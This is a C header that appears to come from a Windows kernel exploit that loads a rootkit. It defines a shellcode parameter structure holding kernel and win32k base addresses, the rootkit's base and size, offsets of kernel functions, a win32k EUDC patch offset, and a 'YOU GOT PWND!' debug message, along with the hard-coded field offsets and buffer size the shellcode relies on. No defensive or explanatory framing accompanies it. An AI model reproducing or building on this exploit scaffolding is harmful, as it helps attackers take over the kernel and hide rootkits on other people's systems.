
#define DBGPRINT_MESSAGE "YOU GOT PWND!\n"
#define DBGPRINT_MESSAGE_LEN 0x20

typedef struct _SC_PARAMS
{
    PVOID kernel_base;
    PVOID win32k_base;

    ULONG rootkit_size;
    PVOID rootkit_base;

    ULONG offset_MmIsAddressValid;
    ULONG offset_PsGetCurrentProcess;
    ULONG offset_PsGetProcessWin32Process;
    ULONG offset_ExAllocatePool;
    ULONG offset_RtlQueryRegistryValues;
    ULONG offset_UserInitialize;
    ULONG offset_bInitializeEUDC_patch;

#ifdef USE_SHELLCODE_DBGPRINT

    ULONG offset_DbgPrint;
    char szDbgPrintMessage[DBGPRINT_MESSAGE_LEN];

#endif

} SC_PARAMS,
*PSC_PARAMS;

/**
 * Offsets for SC_PARAMS fields.
 */
#define _kernel_base                0x00
#define _win32k_base                0x04
#define _rootkit_size               0x08
#define _rootkit_base               0x0c

#define _MmIsAddressValid           0x10
#define _PsGetCurrentProcess        0x14
#define _PsGetProcessWin32Process   0x18
#define _ExAllocatePool             0x1c

#define _RtlQueryRegistryValues     0x20
#define _UserInitialize             0x24
#define _bInitializeEUDC_patch      0x28
#define _DbgPrint                   0x2c

#define _szDbgPrintMessage          0x30

#define SHELLCODE_2_MAX_BUFF_SIZE 0x300
